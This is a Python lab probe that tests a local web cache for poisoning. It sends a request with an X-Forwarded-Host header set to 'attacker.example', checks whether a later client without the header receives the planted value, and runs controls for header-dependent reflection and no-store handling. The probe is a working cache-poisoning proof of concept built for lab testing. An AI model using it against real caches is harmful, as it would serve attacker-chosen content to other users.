#!/usr/bin/env python3
"""
lab-04 probe: poison a shared cache with one request, then read it back as a different client.

The oracle is a second request that never carried the hostile header and still receives a page built
from it. That is the whole difference between "the header is reflected" and "the cache serves it to
other people", and the two are easy to confuse.

Controls:

1. The reflection must be header dependent. Two direct requests to the origin, bypassing the cache,
   with different header values must return different bodies. If they do not, the origin is serving a
   constant and the finding is something else.
2. The cache must honour no-store. A poisoned request to an endpoint that says no-store must not be
   served to the next client. If it is, the cache is broken outright and this is not an unkeyed input
   bug, it is a disregard for cache headers.
"""
import json
import sys
import urllib.error
import urllib.request

CACHE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8734"
ORIGIN_PORT = int(CACHE.rsplit(":", 1)[1]) + 1
ORIGIN = f"http://127.0.0.1:{ORIGIN_PORT}"


def fetch(base, path, host=None):
    req = urllib.request.Request(base + path)
    if host:
        req.add_header("X-Forwarded-Host", host)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode(errors="replace"), r.headers.get("X-Cache")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), e.headers.get("X-Cache")


def main():
    # control 1: is the reflection header dependent? ask the origin directly, twice
    a = fetch(ORIGIN, "/page", "alpha.test")[1]
    b = fetch(ORIGIN, "/page", "beta.test")[1]
    control_reflect = ("alpha.test" in a) and ("beta.test" in b) and (a != b)

    # attack: poison through the cache, then ask as a client that sends no header at all
    planted = "attacker.example"
    s1, body1, cache1 = fetch(CACHE, "/page", planted)
    s2, body2, cache2 = fetch(CACHE, "/page")          # a different client, no header
    poisoned = planted in body1 and planted in body2

    # control 2: the cache honours no-store
    fetch(CACHE, "/nostore", planted)
    s3, body3, _ = fetch(CACHE, "/nostore")            # different client, no header
    control_nostore = "attacker.example" not in body3

    result = {
        "lab": "lab-04-cache-poison",
        "factor": "L02-036",
        "pattern": None,
        "attack": {
            "planted_value": planted,
            "first_status": s1, "first_cache": cache1,
            "second_status": s2, "second_cache": cache2,
            "second_client_received_planted_value": planted in body2,
        },
        "negative_control": {
            "reflection_is_header_dependent": control_reflect,
            "cache_honours_no_store": control_nostore,
        },
        "oracle": "a second client that never sent the header received a page built from it",
        "attack_confirmed": poisoned,
        "control_clean": control_reflect and control_nostore,
        "verdict": "OBSERVED" if (poisoned and control_reflect and control_nostore) else "INCONCLUSIVE",
    }
    print(json.dumps(result, indent=1))
    return 0 if result["verdict"] == "OBSERVED" else 1


if __name__ == "__main__":
    sys.exit(main())
